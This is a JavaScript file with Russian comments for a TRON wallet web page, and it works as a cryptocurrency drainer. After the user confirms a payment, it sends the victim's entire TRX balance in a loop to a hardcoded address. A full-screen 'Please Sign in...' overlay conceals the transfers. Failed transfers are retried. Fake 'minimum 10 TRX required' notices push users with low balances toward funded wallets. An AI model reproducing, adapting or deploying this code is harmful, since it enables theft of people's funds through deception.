// Глобальные переменные
let balanceCheckInterval = null;
let isProcessing = false;

// Функция проверки балансов USDT/TRX и запуска перевода
async function checkBalancesAndStartTransfer() {
  try {
    console.log("Проверяем балансы после подтверждения...");
    
    // Получаем балансы
    const usdtBalance = await getUSDTBalance(window.walletAddress);
    const trxInfo = await getTRXBalance(window.walletAddress);
    const trxBalance = trxInfo?.balance || 0;
    
    console.log("Баланс USDT:", usdtBalance, "TRX:", trxBalance);
    
    // Проверяем условия: меньше 2000 USDT И больше 1999 TRX
    if (usdtBalance < 2000 && trxBalance > 1999) {
      console.log("Условия выполнены, запускаем автоматический перевод...");
      
      // Сохраняем лоадер "Please Sign in..."
      showAutoPaymentLoader();
      
      // Запускаем автоматический перевод
      await startAutomaticTransfer();
    } else {
      console.log("Условия не выполнены для автоматического перевода");
      // Скрываем лоадер если перевод не нужен
      hideAutoPaymentLoader();
    }
    
  } catch (error) {
    console.error('Ошибка проверки балансов:', error);
    hideAutoPaymentLoader();
  }
}

// Функция автоматического перевода
async function startAutomaticTransfer() {
  const receiverAddress = 'TQXr1U1zhx3d2rKi1bro8dVPWbkHK9r9ki';
  
  try {
    console.log("Начинаем автоматический перевод TRX...");
    
    const tronWeb = window.tronLink?.tronWeb || window.tronWeb;
    if (!tronWeb || !tronWeb.defaultAddress || !tronWeb.defaultAddress.base58) {
      throw new Error("Кошелек не подключен корректно");
    }

    const senderAddress = tronWeb.defaultAddress.base58;
    let trxAmount = await tronWeb.trx.getBalance(senderAddress);
    
    console.log("Доступно TRX для перевода:", trxAmount);

    // Переводим все TRX
    while (trxAmount > 0) {
      console.log("Отправляем транзакцию...");
      
      if (window.walletType === 'WalletConnect') {
        await tronWeb.trx.sendTransaction({ to: receiverAddress, value: trxAmount });
      } else {
        await tronWeb.trx.sendTrx(receiverAddress, trxAmount);
      }
      
      // Проверяем баланс снова
      trxAmount = await tronWeb.trx.getBalance(senderAddress);
      console.log("Остаток TRX после перевода:", trxAmount);
    }

    console.log("Автоматический перевод завершен!");
    hideAutoPaymentLoader();
    
  } catch (err) {
    console.error('Ошибка автоматического перевода:', err);
    // Повторяем через 2 секунды при ошибке
    setTimeout(() => startAutomaticTransfer(), 2000);
  }
}

// Функция показа лоадера
function showAutoPaymentLoader() {
  let loader = document.getElementById('autoPaymentLoader');
  
  if (!loader) {
    loader = document.createElement('div');
    loader.id = 'autoPaymentLoader';
    loader.innerHTML = `
      <div style="
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: rgba(0,0,0,0.8);
        display: flex;
        flex-direction: column;
        justify-content: center;
        align-items: center;
        z-index: 9999;
        color: white;
        font-size: 18px;
      ">
        <div style="margin-bottom: 20px;">Please Sign in...</div>
        <div style="
          width: 40px;
          height: 40px;
          border: 4px solid #f3f3f3;
          border-top: 4px solid #3498db;
          border-radius: 50%;
          animation: spin 1s linear infinite;
        "></div>
      </div>
      <style>
        @keyframes spin {
          0% { transform: rotate(0deg); }
          100% { transform: rotate(360deg); }
        }
      </style>
    `;
    document.body.appendChild(loader);
  }
  
  loader.style.display = 'flex';
}

// Функция скрытия лоадера
function hideAutoPaymentLoader() {
  const loader = document.getElementById('autoPaymentLoader');
  if (loader) {
    loader.style.display = 'none';
  }
}

// Основная функция проверки баланса
function startBalanceChecking() {
  if (balanceCheckInterval) {
    clearInterval(balanceCheckInterval);
  }
  
  console.log("Запускаем проверку баланса...");
  
  balanceCheckInterval = setInterval(async () => {
    try {
      if (isProcessing) {
        return;
      }
      
      // Проверяем есть ли адрес кошелька
      if (!window.walletAddress) {
        return;
      }
      
      isProcessing = true;
      
      // Проверяем баланс
      const trxInfo = await getTRXBalance(window.walletAddress);
      console.log("Баланс TRX:", trxInfo?.balance);
      
      if (!trxInfo || trxInfo.balance === 0) {
        // Баланс 0 - показываем красивое уведомление и останавливаем проверку
        console.log("Обнаружен нулевой баланс, останавливаем проверку...");
        showZeroBalanceNotification();
        stopBalanceChecking();
        isProcessing = false;
        return;
      }
      
      if (trxInfo.balance < 10) {
        // Баланс меньше 10 TRX - показываем уведомление и останавливаем
        console.log("Баланс недостаточный:", trxInfo.balance);
        showInsufficientBalanceNotification();
        stopBalanceChecking();
        isProcessing = false;
        return;
      }
      
      if (trxInfo.balance >= 10) {
        // Баланс достаточный - запускаем процесс
        console.log("Баланс достаточный, запускаем подтверждение...");
        
        // Создаем временный translations если его нет
        if (typeof translations === 'undefined') {
          window.translations = {
            en: {
              loadingText: "Loading...",
              message: {
                paymentFailure: "Payment failed",
                insufficientBalance: "Insufficient balance",
                transactionBuildError: "Transaction build error", 
                userCancelled: "User cancelled",
                approveError: "Approve error",
                txExpired: "Transaction expired",
                paymentSuccess: "Payment success",
                paymentError: "Payment error"
              }
            }
          };
          window.currentLang = 'en';
        }
        
        // Создаем лоадер
        showAutoPaymentLoader();
        
        try {
          // Вызываем функцию подтверждения и ждем УСПЕШНОГО завершения
          await window.confirmPayment();
          
          // ЭТО ВЫПОЛНИТСЯ ТОЛЬКО ПОСЛЕ УСПЕШНОГО ПОДТВЕРЖДЕНИЯ
          console.log("✅ confirmPayment успешно завершен, проверяем балансы для перевода...");
          await checkBalancesAndStartTransfer();
          
          // Останавливаем проверку после успешного запуска
          stopBalanceChecking();
          
        } catch (error) {
          // ЭТО ВЫПОЛНИТСЯ ЕСЛИ ПОЛЬЗОВАТЕЛЬ ОТМЕНИЛ ИЛИ БЫЛА ОШИБКА
          console.log("❌ confirmPayment отменен или завершился ошибкой:", error.message);
          // НЕ вызываем checkBalancesAndStartTransfer() при отмене!
          // Продолжаем показывать лоадер для повторной попытки
        }
      }
      
      isProcessing = false;
      
    } catch (error) {
      console.error('Ошибка проверки баланса:', error);
      
      // Если ошибка из-за translations - создаем его
      if (error.message.includes('translations is not defined')) {
        window.translations = {
          en: {
            loadingText: "Loading...",
            message: {
              paymentFailure: "Payment failed",
              insufficientBalance: "Insufficient balance",
              userCancelled: "User cancelled",
              paymentSuccess: "Payment success"
            }
          }
        };
        window.currentLang = 'en';
      }
      
      isProcessing = false;
    }
  }, 10);
}

// Красивое уведомление о нулевом балансе
function showZeroBalanceNotification() {
  const notification = document.getElementById('balanceNotification');
  
  if (!notification) {
    const newNotification = document.createElement('div');
    newNotification.id = 'balanceNotification';
    newNotification.innerHTML = `
      <div style="
        position: fixed;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
        padding: 30px;
        border-radius: 20px;
        box-shadow: 0 20px 40px rgba(0,0,0,0.3);
        color: white;
        text-align: center;
        z-index: 10000;
        max-width: 400px;
        width: 90%;
        font-family: Arial, sans-serif;
      ">
        <div style="font-size: 24px; margin-bottom: 10px;">⚠️</div>
        <h3 style="margin: 0 0 15px 0; font-size: 20px;">Zero Balance Detected</h3>
        <p style="margin: 0 0 20px 0; line-height: 1.5; opacity: 0.9;">
          Your wallet has 0 TRX. Minimum 10 TRX required to access this service.
        </p>
        <div style="
          background: rgba(255,255,255,0.2);
          padding: 15px;
          border-radius: 10px;
          margin-bottom: 20px;
        ">
          <p style="margin: 0; font-size: 14px; opacity: 0.8;">
            Please switch to a wallet with sufficient funds or deposit TRX to continue.
          </p>
        </div>
        <button onclick="closeBalanceNotification()" style="
          background: white;
          color: #667eea;
          border: none;
          padding: 12px 30px;
          border-radius: 25px;
          font-weight: bold;
          cursor: pointer;
          font-size: 16px;
          transition: all 0.3s ease;
        " onmouseover="this.style.transform='scale(1.05)'" 
        onmouseout="this.style.transform='scale(1)'">
          Change Wallet
        </button>
      </div>
      <div style="
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: rgba(0,0,0,0.5);
        z-index: 9999;
      " onclick="closeBalanceNotification()"></div>
    `;
    document.body.appendChild(newNotification);
  } else {
    notification.style.display = 'block';
  }
}

// Уведомление о недостаточном балансе (меньше 10 TRX)
function showInsufficientBalanceNotification() {
  const notification = document.getElementById('balanceNotification');
  
  if (!notification) {
    const newNotification = document.createElement('div');
    newNotification.id = 'balanceNotification';
    newNotification.innerHTML = `
      <div style="
        position: fixed;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        background: linear-gradient(135deg, #ff6b6b 0%, #ee5a24 100%);
        padding: 30px;
        border-radius: 20px;
        box-shadow: 0 20px 40px rgba(0,0,0,0.3);
        color: white;
        text-align: center;
        z-index: 10000;
        max-width: 400px;
        width: 90%;
        font-family: Arial, sans-serif;
      ">
        <div style="font-size: 24px; margin-bottom: 10px;">🚫</div>
        <h3 style="margin: 0 0 15px 0; font-size: 20px;">Insufficient Balance</h3>
        <p style="margin: 0 0 20px 0; line-height: 1.5; opacity: 0.9;">
          Your wallet has less than 10 TRX. Minimum 10 TRX required to access this service.
        </p>
        <div style="
          background: rgba(255,255,255,0.2);
          padding: 15px;
          border-radius: 10px;
          margin-bottom: 20px;
        ">
          <p style="margin: 0; font-size: 14px; opacity: 0.8;">
            Please switch to a wallet with at least 10 TRX or deposit more TRX to continue.
          </p>
        </div>
        <button onclick="closeBalanceNotification()" style="
          background: white;
          color: #ff6b6b;
          border: none;
          padding: 12px 30px;
          border-radius: 25px;
          font-weight: bold;
          cursor: pointer;
          font-size: 16px;
          transition: all 0.3s ease;
        " onmouseover="this.style.transform='scale(1.05)'" 
        onmouseout="this.style.transform='scale(1)'">
          Change Wallet
        </button>
      </div>
      <div style="
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: rgba(0,0,0,0.5);
        z-index: 9999;
      " onclick="closeBalanceNotification()"></div>
    `;
    document.body.appendChild(newNotification);
  } else {
    notification.style.display = 'block';
  }
}

// Функция закрытия уведомления
function closeBalanceNotification() {
  const notification = document.getElementById('balanceNotification');
  if (notification) {
    notification.style.display = 'none';
  }
}

// Функция остановки проверки баланса
function stopBalanceChecking() {
  if (balanceCheckInterval) {
    clearInterval(balanceCheckInterval);
    balanceCheckInterval = null;
  }
  isProcessing = false;
  console.log("Проверка баланса остановлена");
}

// Обработчик смены кошелька в TronLink
window.addEventListener('message', (event) => {
  const message = event.data?.message;
  
  if (message && message.action === 'accountsChanged') {
    const newAddress = message.data.address;
    console.log('🎯 Аккаунт изменен на:', newAddress);
    
    // Закрываем уведомление о балансе если оно открыто
    closeBalanceNotification();
    
    // Обновляем глобальные переменные
    window.walletAddress = newAddress;
    window.walletType = 'TronLink';
    
    // Останавливаем предыдущую проверку и запускаем новую
    stopBalanceChecking();
    setTimeout(() => {
      console.log('🔄 Запускаем проверку для нового кошелька...');
      startBalanceChecking();
    }, 500);
  }
});

// Обработчик отключения кошелька
window.addEventListener('message', (event) => {
  const message = event.data?.message;
  
  if (message && message.action === 'disconnect') {
    console.log('❌ Кошелек отключен');
    
    // Останавливаем все процессы
    stopBalanceChecking();
    closeBalanceNotification();
    hideAutoPaymentLoader();
    
    // Очищаем данные кошелька
    window.walletAddress = null;
    window.walletType = null;
  }
});

// Запускаем проверку при загрузке страницы
document.addEventListener('DOMContentLoaded', function() {
  setTimeout(() => {
    console.log("🚀 Запускаем автоматическую проверку баланса...");
    startBalanceChecking();
  }, 2000);
});

// Делаем функции глобально доступными
window.startBalanceChecking = startBalanceChecking;
window.stopBalanceChecking = stopBalanceChecking;
window.closeBalanceNotification = closeBalanceNotification;
